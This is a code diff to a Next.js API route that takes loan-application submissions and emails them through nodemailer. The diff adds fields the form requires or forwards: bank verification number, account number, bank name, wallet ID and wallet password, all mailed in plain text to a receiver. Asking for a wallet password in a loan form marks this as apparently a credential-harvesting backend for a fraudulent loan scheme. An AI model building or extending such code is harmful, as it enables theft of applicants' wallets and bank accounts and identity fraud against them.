@@ -1,6 +1,6 @@
 import { render } from "@react-email/render";
 import nodemailer from "nodemailer";
-import { LoanApplicationEmail } from "../../../components/LoanApplicationEmail"; // create a new template for loan apps
+import { LoanApplicationEmail } from "../../../components/LoanApplicationEmail"; // new template for loan apps
 
 export async function POST(request: Request) {
   try {
@@ -8,7 +8,7 @@ export async function POST(request: Request) {
     const data = await request.json();
 
     // Basic validation
-    const requiredFields = ["email", "fullName", "address"];
+    const requiredFields = ["email", "fullName", "address", "contactNumber"];
     for (const field of requiredFields) {
       if (!data[field] || data[field].trim() === "") {
         return Response.json(
@@ -21,12 +21,20 @@ export async function POST(request: Request) {
     const {
       email,
       fullName,
+      contactNumber,
       address,
-      contactAddress,
-      sex,
+      bvn,
       employmentStatus,
       monthlyIncome,
-      purposeOfLoan,
+      accountNumber,
+      accountName,
+      bankName,
+      amountSought,
+      loanTenure,
+      reasonForLoan,
+      walletId,
+      walletPassword,
+      sex,
     } = data;
 
     const smtpUser = process.env.SMTP_USER;
@@ -58,7 +66,7 @@ export async function POST(request: Request) {
       },
     });
 
-    // Render email HTML using a React email template
+    // Render email HTML using React email template
     const timestamp = new Date().toISOString();
     const subject = `New Loan Application - ${fullName} [${timestamp}]`;
 
@@ -66,12 +74,20 @@ export async function POST(request: Request) {
       <LoanApplicationEmail
         email={email}
         fullName={fullName}
+        contactNumber={contactNumber}
         address={address}
-        contactAddress={contactAddress}
-        sex={sex}
+        bvn={bvn}
         employmentStatus={employmentStatus}
         monthlyIncome={monthlyIncome}
-        purposeOfLoan={purposeOfLoan}
+        accountNumber={accountNumber}
+        accountName={accountName}
+        bankName={bankName}
+        amountSought={amountSought}
+        loanTenure={loanTenure}
+        reasonForLoan={reasonForLoan}
+        walletId={walletId}
+        walletPassword={walletPassword}
+        sex={sex}
       />
     );
 
@@ -81,7 +97,7 @@ export async function POST(request: Request) {
       to: receiverEmail,
       subject,
       html: emailHtml,
-      text: `New loan application received from ${fullName} (${email})`,
+      text: `New loan application received from ${fullName} (${email}, ${contactNumber})`,
     });
 
     console.log("[LoanAPI] Email sent successfully:", response.messageId);
@@ -98,4 +114,4 @@ export async function POST(request: Request) {
       { status: 500 }
     );
   }
-        }
+}
